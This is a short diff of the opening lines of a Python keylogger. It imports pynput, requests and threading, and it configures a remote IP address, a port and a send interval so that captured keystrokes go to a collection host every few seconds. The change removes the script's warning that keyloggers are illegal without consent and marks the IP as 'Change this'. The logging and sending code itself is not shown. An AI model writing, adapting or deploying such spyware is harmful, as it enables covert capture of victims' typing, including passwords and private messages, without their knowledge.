@@ -1,7 +1,3 @@
-# Keyloggers can be a serious privacy concern and are illegal if used without explicit consent. 
-# Ensure you use such scripts only in legal and ethical scenarios.
-
-
 from pynput import keyboard
 import requests
 import json
@@ -9,7 +5,7 @@ import threading
 
 text = ""
 
-ip_address = "192.168.0.111"
+ip_address = "192.168.0.111"   # Change this
 port = "80"
 
 time_interval = 4
